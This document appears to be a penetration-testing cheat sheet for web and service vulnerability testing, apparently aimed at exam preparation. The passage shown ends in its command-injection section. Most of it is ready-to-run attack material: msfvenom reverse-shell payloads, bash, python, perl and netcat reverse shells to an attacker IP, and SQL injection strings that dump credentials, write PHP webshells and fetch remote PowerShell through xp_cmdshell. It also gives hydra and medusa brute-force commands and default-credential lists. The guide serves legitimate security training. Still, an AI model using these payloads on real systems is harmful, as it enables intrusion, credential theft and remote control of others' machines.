# Vulnerability Assessment & Web Testing

## üéØ Goal

Transform raw enumeration data into concrete, testable vulnerabilities

---

## Table of Contents

1. [Service Documentation and Research](#1-service-documentation-and-initial-research)
2. [Manual Vulnerability Identification](#2-manual-vulnerability-identification)
3. [Web Application Vulnerability Testing](#3-web-application-vulnerability-testing)
4. [Automated Scanning](#4-automated-scanning-support-role)
5. [Service-Specific Vulnerability Checks](#5-service-specific-vulnerability-checks)
6. [Building the Exploitation Plan](#6-building-the-exploitation-plan)


---

## üìã Phase Checklist

### üñ•Ô∏è For Each Host/Application

### Service Documentation and Research
- [ ] **Quick search for known CVEs** ‚Üí [1.1](#11-cve-research)
- [ ] **Version fingerprinting completed** ‚Üí [1.2](#12-version-fingerprinting)

### Manual Vulnerability Identification
- [ ] **HTTP methods and configuration checks** ‚Üí [2.1](#21-http-method-and-configuration-checks)
- [ ] **Default credentials researched & tested** ‚Üí [2.2](#22-default-credential-checks-targeted-approach)

### Web Application Testing
- [ ] **Directory and content discovery** ‚Üí [3.1](#31-directory-and-content-discovery)
- [ ] **SQL Injection testing** ‚Üí [3.2](#32-sql-injection-manual-testing-first)
- [ ] **Command Injection testing** ‚Üí [3.3](#33-command-injection)
- [ ] **File Upload vulnerabilities** ‚Üí [3.4](#34-file-upload-vulnerabilities)
- [ ] **Path Traversal/LFI/RFI** ‚Üí [3.5](#35-path-traversal-and-lfirfi)
- [ ] **XSS vulnerabilities** ‚Üí [3.6](#36-xss-cross-site-scripting)
- [ ] **Advanced vulnerabilities** (XXE, SSRF, SSTI, IDOR) ‚Üí [3.7](#37-advanced-vulnerability-classes)
- [ ] **Authentication and authorization** ‚Üí [3.8](#38-authentication-and-authorization-testing)

### Automated Scanning
- [ ] **Nikto web misconfiguration scan** ‚Üí [4.1](#41-nikto-web-misconfiguration-scanner)
- [ ] **Nuclei template-based scanning** ‚Üí [4.2](#42-nuclei-template-based-vulnerability-scanning)
- [ ] **WPScan for WordPress sites** ‚Üí [4.3](#43-wpscan-wordpress-vulnerability-scanner)

### Service-Specific Checks
- [ ] **FTP anonymous access & permissions** ‚Üí [5.1](#51-ftp-service-port-21)
- [ ] **SSH version & algorithms** ‚Üí [5.2](#52-ssh-service-port-22)
- [ ] **SMB shares enumeration & vulnerabilities** ‚Üí [5.3](#53-smbnetbios-services-ports-139-445)
- [ ] **Database services weak authentication** ‚Üí [5.4](#54-database-services)
- [ ] **Email services enumeration** ‚Üí [5.5](#55-email-services)
- [ ] **Web server misconfigurations** ‚Üí [5.6](#56-web-server-specific)
- [ ] **Network protocols** (SNMP, NFS, RDP, LDAP, WinRM) ‚Üí [5.7](#57-network-services)

### Documentation & Planning
- [ ] **Vulnerabilities prioritized by severity** ‚Üí [6.1](#61-vulnerability-prioritization-matrix)
- [ ] **All findings documented with evidence** ‚Üí [6.2](#62-vulnerability-documentation-template)
- [ ] **Attack chains planning** ‚Üí [6.3](#63-attack-chain-planning)

---

## üõ†Ô∏è Quick Setup Commands

```bash
# Terminal 1: Listener
nc -lvnp 4444
```

```bash
# Terminal 2: HTTP server for payloads
cd /opt/shells && python3 -m http.server 80
```

```bash
# Terminal 3: SMB server (Windows targets)
impacket-smbserver share . -smb2support
```

```bash
# Common payload generation #1
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf
```
```bash
# Common payload generation #2
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe
```

```bash
# Common payload generation #3
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php
```

---

### ‚ö° One-Liner Cheat Sheet

```bash
# Quick vulnerability scan
nmap --script vuln <IP>
```

```bash
# Fast web directory scan
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://<IP>/ -t 50
```

```bash
# SMB quick check
netexec smb <IP> -u '' -p '' --shares
```

```bash
# Check for EternalBlue
nmap --script smb-vuln-ms17-010 <IP>
```

```bash
# Generate quick reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
```

---

## üìö Essential Bookmarks

| Resource | URL | Use Case |
|----------|-----|----------|
| PayloadsAllTheThings | swisskyrepo.github.io/PayloadsAllTheThings/ | All payload types |
| HackTricks | book.hacktricks.xyz | Comprehensive methodology |
| GTFOBins | gtfobins.github.io | Linux privilege escalation |
| LOLBAS | lolbas-project.github.io | Windows living-off-the-land |
| RevShells | revshells.com | Reverse shell generator |
| CyberChef | gchq.github.io/CyberChef | Encoding/decoding |
| Exploit-DB | exploit-db.com | Public exploits |

---

## üîß Wordlist Locations

```bash
# Directory/file discovery
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Password lists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# Username lists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Fuzzing
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
```
---

## 1 Service Documentation and Initial Research

### 1.1 CVE Research

```bash
# Search for service vulnerabilities
searchsploit <SERVICE> <VERSION>
searchsploit -m <EDB-ID>  # Mirror exploit locally
searchsploit -x <EDB-ID>  # Examine exploit
searchsploit -w <EDB-ID>  # Get online URL

# Update searchsploit database
searchsploit -u

# Search with case-insensitive
searchsploit -i <SERVICE>

# Alternative CVE databases (web search)
# https://cve.mitre.org/
# https://nvd.nist.gov/
# https://www.exploit-db.com/
# https://packetstormsecurity.com/
```



### 1.2 Version Fingerprinting

```bash
# Banner grabbing #1
nc -nv <IP> <PORT>
```

```bash
# Banner grabbing #2
telnet <IP> <PORT>
```

```bash
# HTTP server identification #1
curl -I https://<IP>/
```

```bash
# HTTP server identification #2
curl -s -D- https://<IP>/ -o /dev/null
```

```bash
# HTTP server identification #3
curl -v https://<IP>/ 2>&1 | grep -E "Server:|X-Powered-By:"
```

```bash
# Detailed HTTP headers and technologies #1
whatweb https://<IP>/ -v
```

```bash
# Detailed HTTP headers and technologies #1
whatweb https://<IP>/ --color=never --no-errors -a 3
```

```bash
# TLS/SSL certificate information #1
openssl s_client -connect <IP>:443 < /dev/null
```

```bash
# TLS/SSL certificate information #2
openssl s_client -connect <IP>:443 -showcerts < /dev/null
```

```bash
# SSL/TLS vulnerability scanning #1
sslyze --regular <IP>:443
```

```bash
# SSL/TLS vulnerability scanning #2
nmap --script ssl-enum-ciphers,ssl-cert <IP> -p 443
```

---

## 2 Manual Vulnerability Identification

### 2.1 HTTP Method and Configuration Checks

```bash
# üîé Allowed methods discovery #1
curl -X OPTIONS -i https://<IP>/
```

```bash
# üîé Allowed methods discovery #2
curl -v -X OPTIONS https://<IP>/
```

```bash
# ‚ö†Ô∏è Test dangerous method PUT
curl -X PUT https://<IP>/test.txt -d "test payload"
```

```bash
# ‚ö†Ô∏è Test dangerous method DELETE
curl -X DELETE https://<IP>/test.txt
```

```bash
# ‚ö†Ô∏è Test dangerous method TRACE
curl -X TRACE https://<IP>/
```

```bash
# ‚ö†Ô∏è Test dangerous method TRACK
curl -X TRACK https://<IP>/
```

```bash
# Test for WebDAV #1
davtest -url https://<IP>/
```

```bash
# Test for WebDAV #2
davtest -url https://<IP>/webdav/
```

```bash
# Test for WebDAV #3
cadaver https://<IP>/
```

```bash
# Nmap WebDAV detection
nmap --script http-webdav-scan <IP> -p 80,443
```

**üìÅ Common Config Files to Check:**

```bash
# Web server configs
web.config
.htaccess
httpd.conf
apache2.conf
nginx.conf
server-status
server-info

# Application configs  
config.php
.env
.env.local
.env.backup
.env.prod
config.json
config.yml
settings.php
configuration.php
database.yml
config.ini

# WordPress specific
wp-config.php
wp-config.php.bak
wp-config.php~

# Information disclosure
phpinfo.php
info.php
test.php
admin.php
debug.php
backup.zip
backup.sql
db_backup.sql
.git/config
.git/HEAD
.svn/entries
.hg/
.bzr/

# Common backup files
index.php.bak
index.php~
index.php.old
index.php.orig
index.php.save
web.config.bak
backup/
backups/
old/

# Robot and sitemap files
robots.txt
sitemap.xml
sitemap_index.xml

# Common API endpoints
api/
api/v1/
api/v2/
rest/
graphql
```

### 2.2 Default Credential Checks (Targeted Approach)

**üéØ Common Admin Panels:**

```
/admin
/administrator
/admin.php
/admin.html
/admin/
/wp-admin
/wp-login.php
/phpmyadmin
/phpMyAdmin
/pma
/manager/html (Tomcat)
/host-manager/html (Tomcat)
/console (JBoss)
/admin-console
/cpanel
/webmail
/login
/login.php
Router/camera management interfaces
Database administration consoles
```

**üß™ Common Credential Combinations:**

```
admin:admin
admin:password
admin:Password123
admin:admin123
admin:pass
admin:root
admin:[empty]
administrator:administrator
administrator:password
root:root
root:toor
root:password
root:admin
guest:guest
user:user
test:test
tomcat:tomcat
tomcat:s3cret
admin:password123
admin:123456
admin:admin1
sa:[empty] (MSSQL)
postgres:postgres
mysql:mysql
oracle:oracle
```

**üîç Credential Testing Tools:**

```bash
# Hydra - Multiple protocols
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V
```

```bash
# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin
```

```bash
# SSH brute forcing (use carefully) - root user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
```

```bash
# SSH brute forcing (use carefully)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4
```

```bash
# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
```

```bash
# NetExec (formerly CrackMapExec) - SMB
netexec smb <IP> -u admin -p /usr/share/wordlists/rockyou.txt
```

```bash
# NetExec (formerly CrackMapExec) - SMB null session
netexec smb <IP> -u '' -p '' --shares
```

```bash
# NetExec (formerly CrackMapExec) - SMB guest access
netexec smb <IP> -u guest -p '' --shares  
```

```bash
# # NetExec (formerly CrackMapExec) WinRM
netexec winrm <IP> -u admin -p password
```

```bash
# # NetExec (formerly CrackMapExec) MSSQL
netexec mssql <IP> -u sa -p '' --local-auth
```

```bash
# Medusa - Alternative to Hydra (SSH)
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
```

```bash
# Medusa - Alternative to Hydra (FTP)
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

> ‚ö†Ô∏è¬†**Warning**: Avoid aggressive brute-forcing; use context-aware guesses first. Check exam restrictions on authentication attacks. Account lockout policies may trigger.

---

## 3 Web Application Vulnerability Testing

**üìö Essential Resources (Keep Open):**

- [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/)
- [HackTricks](https://book.hacktricks.xyz/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### 3.1 Directory and Content Discovery

#### Gobuster

```bash
# Basic directory enumeration
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://<IP>/
```

```bash
# With file extensions
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u https://<IP>/ -x php,txt,html,bak
```

```bash
# Full URL display with status codes
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u https://<IP>/ -x php,txt,html,js -e -s "200,204,301,302,307,401,403"
```

```bash
# Common extensions for different technologies
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/ -x php,html,txt,pdf,zip,bak,old,tar,gz
```

```bash
# Lowercase wordlist (bypass some filters)
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<IP>/ -k --wildcard
```

```bash
# API endpoint discovery
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://<IP>/api/ -e -s 200
```

```bash
# With authentication (cookies)
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/ -c "PHPSESSID=abc123"
```

```bash
# With authentication (basic auth)
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/ -U admin -P password
```

```bash
# DNS subdomain enumeration
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

```bash
# Virtual host discovery
gobuster vhost -u https://<IP>/ -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

#### FFUF (Fast Web Fuzzer)

```bash
# Basic directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ
```

```bash
# With extensions
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -e .php,.html,.txt,.pdf,.zip
```

```bash
# Filter by size (eliminate false positives)
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -fs 1234
```

```bash
# Filter by word count
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -fw 42
```

```bash
# Filter by line count
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -fl 20
```

```bash
# Match specific status codes with output
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -mc 200,204,301,302,307,401,403 -o results.txt -of json
```

```bash
# Colorized output with auto-calibration
ffuf -c -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -ac
```

```bash
# Virtual host discovery with auto-calibration
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.example.com" -u https://<IP>/ -ac
```

```bash
# Virtual host with size filter
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.example.com" -u https://<IP>/ -fs 185
```

```bash
# Date/numeric fuzzing (backup files, year ranges)
ffuf -c -w <(seq 2015 2024) -u https://<IP>/backups/backup_FUZZ.zip
ffuf -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u https://<IP>/backups/backup_2024070416FUZZ.zip
```

```bash
# API fuzzing
ffuf -u https://<IP>/api/v2/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -c -ac -t 250 -fc 400,404,412
```

```bash
# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://<IP>/admin.php?FUZZ=test -fs 1234 -mc all
```

```bash
# POST data fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/login.php -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fc 401
```

```bash
# LFI fuzzing
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://<IP>/index.php?page=FUZZ -fs 15349
```

```bash
# Fuzzing with cookies/session
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -u "https://<IP>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

```bash
# Recursion mode (careful - can be slow)
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://<IP>/FUZZ -recursion -recursion-depth 2
```

```bash
# File extension discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://<IP>/logs/FUZZ -e .log,.txt,.bak
```

```bash
# Rate limiting (requests per second)
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -rate 100 -u https://<IP>/FUZZ -mc 200,429
```

```bash
# Massive file extension discovery (use with caution)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u https://<IP>/FUZZ -t 30 -c \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' \
  -mc 200,204,301,302,307,401,403,500 -ic \
  -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

```bash
# POST request from file
ffuf -request request.txt -w /usr/share/wordlists/dirb/common.txt -request-proto http
```

```bash
# IDOR testing with sequential numbers
seq 1 1000 | ffuf -w - -u https://<IP>/user?id=FUZZ -mr "admin|root" -mc 200
```

```bash
# Multi-position fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ1 -w /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt:FUZZ2 -u https://<IP>/FUZZ1FUZZ2 -mc 200
```

```bash
# Output formats: json, ejson, html, md, csv, ecsv
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -o output.json -of json
```

#### WFuzz

```bash
# Basic directory fuzzing
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u https://<IP>/FUZZ/ --hc 404,403
```

```bash
# With file extensions
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u https://<IP>/FUZZ.php --hc 404,403
```

```bash
# Multiple extensions (FUZ2Z)
wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt -u https://<IP>/FUZZ.FUZ2Z -z list,txt-php-html-js --hc 403,404 -c
```

```bash
# Hide responses by lines
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ --hl 20
```

```bash
# Hide responses by words
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ --hw 100
```

```bash
# Hide responses by characters
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ --hh 1234
```

```bash
# Show only specific status codes with output
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ --sc 200,301,302 -f output.txt
```

```bash
# POST data fuzzing
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/login.php -d "username=admin&password=FUZZ" --hc 401
```

```bash
# Header fuzzing (User-Agent)
wfuzz -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H "User-Agent: FUZZ" -u https://<IP>/ --hc 404
```

```bash
# Cookie fuzzing
wfuzz -w /usr/share/wordlists/dirb/common.txt -b "session=FUZZ" -u https://<IP>/admin --hc 403
```

```bash
# Multiple fuzz points
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ/FUZ2Z -z list,txt-php --hc 403,404
```

```bash
# With threads
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -t 20 --hc 404
```

```bash
# Follow redirects
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ --follow --hc 404
```

```bash
# Proxy through Burp
wfuzz -w /usr/share/wordlists/dirb/common.txt -u https://<IP>/FUZZ -p 127.0.0.1:8080 --hc 404
```

### 3.2 SQL Injection (Manual Testing First)

> üìñ¬†**Reference**:¬†[SQL Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)

**üéØ Initial Probing Payloads:**

```sql
' 
" 
'-- 
"-- 
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
" OR "1"="1"--
' OR 1=1--
" OR 1=1--
admin'--
admin"--
admin' OR '1'='1
admin' OR 1=1--
admin") OR ("1"="1
1' AND 1=1--
1' AND 1=2--
1' OR '1'='1
OR 1=1--
' UNION SELECT NULL--
```

**üîç Observation Points:**

- Error messages revealing DB structure (MySQL, MSSQL, PostgreSQL)
- Content changes with true/false conditions
- Response time differences (Time-based SQLi)
- Different behavior between¬†`1=1`¬†(true) and¬†`1=2`¬†(false) conditions
- Blank pages or different content lengths
- Database-specific error messages

**üß™ Union-Based Testing (Column Discovery):**

```sql
# Discover number of columns
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
1' UNION SELECT NULL,NULL,NULL,NULL--
1' UNION SELECT NULL,NULL,NULL,NULL,NULL--

# Alternative: ORDER BY method
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
# Continue until error reveals column count

# Test which columns contain text
1' UNION SELECT 'a',NULL,NULL--
1' UNION SELECT NULL,'a',NULL--
1' UNION SELECT NULL,NULL,'a'--
```

**üìà Data Extraction (When Confirmed):**

**MySQL:**

```sql
# Version
' UNION SELECT NULL,@@version,NULL--
-1 UNION SELECT NULL,@@version,NULL--
' UNION SELECT @@version,NULL--

# Current database name
' UNION SELECT NULL,database(),NULL--
' UNION SELECT database()--

# Current user
' UNION SELECT NULL,user(),NULL--
' UNION SELECT NULL,current_user(),NULL--

# List all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--

# List tables in current database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();#

# List columns in specific table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='users'--
-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users';#

# Dump data from specific table
-1 UNION SELECT 1,2,group_concat(username,':',password) FROM users;#
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Read files (requires FILE privilege)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
-1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--

# Write webshell (requires FILE privilege and write permissions)
' UNION SELECT NULL,"<?php system($_GET['cmd']);?>",NULL INTO OUTFILE "/var/www/html/shell.php"--
-1 UNION SELECT 1,"<?php system($_GET['cmd']);?>",3 INTO OUTFILE "/var/www/html/shell.php"--

# Bypass filters with comments
' UN/**/ION SE/**/LECT NULL,database()--
```

**MSSQL:**

```sql
# Authentication bypass
' OR 1=1--
admin'--
' OR '1'='1'--

# Version detection (time-based)
'; IF (SELECT @@version) LIKE '%2019%' WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:5'--

# Get version
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT @@version,NULL--

# Current database
' UNION SELECT NULL,DB_NAME(),NULL--

# List databases
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT name FROM master..sysdatabases--

# List tables in current database
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

# List columns in specific table
' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

# Current user
' UNION SELECT NULL,SYSTEM_USER,NULL--
' UNION SELECT NULL,USER_NAME(),NULL--

# Enable xp_cmdshell (requires sysadmin)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

# Execute commands via xp_cmdshell
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''https://10.10.14.5/shell.ps1'')"';--

# Read files
' UNION SELECT NULL,BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
```

**PostgreSQL:**

```sql
# Version
' UNION SELECT NULL,version(),NULL--

# Current database
' UNION SELECT NULL,current_database(),NULL--

# Current user
' UNION SELECT NULL,current_user,NULL--

# List databases
' UNION SELECT NULL,datname,NULL FROM pg_database--

# List tables in current database
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--

# List columns in specific table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Dump data
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Command execution (requires superuser)
'; COPY (SELECT '') TO PROGRAM 'id';--
'; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;--

# Read files (requires superuser)
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,1000000),NULL--
```

**SQLite:**

```sql
# List tables
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'--

# List columns (from CREATE statement)
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--

# Dump data
' UNION SELECT NULL,group_concat(username || ':' || password),NULL FROM users--

# SQLite version
' UNION SELECT NULL,sqlite_version(),NULL--
```

**Oracle:**

```sql
# Version
' UNION SELECT NULL,banner,NULL FROM v$version--

# Current user
' UNION SELECT NULL,user,NULL FROM dual--

# List tables
' UNION SELECT NULL,table_name,NULL FROM all_tables--

# List columns
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

# Note: Oracle requires FROM clause, use "dual" dummy table
```

**üïê Time-Based Blind SQL Injection:**

```sql
# MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

# MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END;--
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END;--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

**üî® Boolean-Based Blind SQL Injection:**

```sql
# Check if first character of database name is 'a'
' AND SUBSTRING(database(),1,1)='a'--

# ASCII comparison (bruteforce each character)
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))=109--

# Check table existence
' AND (SELECT COUNT(*) FROM users)>0--
' AND EXISTS(SELECT * FROM users)--

# Extract data character by character
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
```

**‚ö†Ô∏è Note About SQLMap:**

> SQLmap is¬†**often prohibited**¬†in pentesting exams. Always use manual techniques above for exam scenarios. SQLmap can be used in practice environments:

```bash
# Basic detection (PRACTICE ONLY - CHECK EXAM RULES)
sqlmap -u "https://<IP>/product.php?id=1" --batch
```

```bash
# Database enumeration
sqlmap -u "https://<IP>/product.php?id=1" --batch --dbs
```

```bash
# Tables in specific database
sqlmap -u "https://<IP>/product.php?id=1" -D webapp_db --tables
```

```bash
# Dump specific table
sqlmap -u "https://<IP>/product.php?id=1" -D webapp_db -T users --dump
```

```bash
# Dump all databases
sqlmap -u "https://<IP>/product.php?id=1" --dump-all --exclude-sysdbs
```

```bash
# POST request
sqlmap -u "https://<IP>/login.php" --data="username=admin&password=pass" --level=5 --risk=3
```

```bash
# With cookie authentication
sqlmap -u "https://<IP>/page.php?id=1" --cookie="PHPSESSID=abc123" --batch
```

```bash
# From Burp request file
sqlmap -r request.txt --batch
```

```bash
# OS shell (if privileges allow)
sqlmap -u "https://<IP>/product.php?id=1" --os-shell
```

```bash
# Read file
sqlmap -u "https://<IP>/product.php?id=1" --file-read="/etc/passwd"
```

```bash
# Write file
sqlmap -u "https://<IP>/product.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### 3.3 Command Injection

> üìñ¬†**Reference**:¬†[Command Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)

**üéØ Test Payloads:**

```bash
# Semicolon separator
; id
; whoami
; ls
; pwd

# Pipe operator
| id
| whoami
| ls -la

# Logic operators
&& id
&& whoami
|| id
|| whoami
& id
& whoami

# Command substitution
`id`
$(id)
`whoami`
$(whoami)
`ls -la`
$(ls -la)

# Newline injection
%0aid
%0awhoami

# Full command injection examples
; cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
&& cat /etc/passwd

# Reverse shell injection
; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
| bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# Python reverse shell
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Perl reverse shell
; perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows command injection
& whoami
| whoami
|| whoami
; whoami
%0awhoami
`whoami`
& dir
| ipconfig
& net user
```

**‚è±Ô∏è Blind Injection Detection (Time-Based):**

```bash
# Sleep commands (Linux)
; sleep 5
& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; sleep 10 &

# Ping based (works on both Windows/Linux)
; ping -c 10 127.0.0.1
& ping -c 10 127.0.0.1
| ping -n 10 127.0.0.1  # Windows

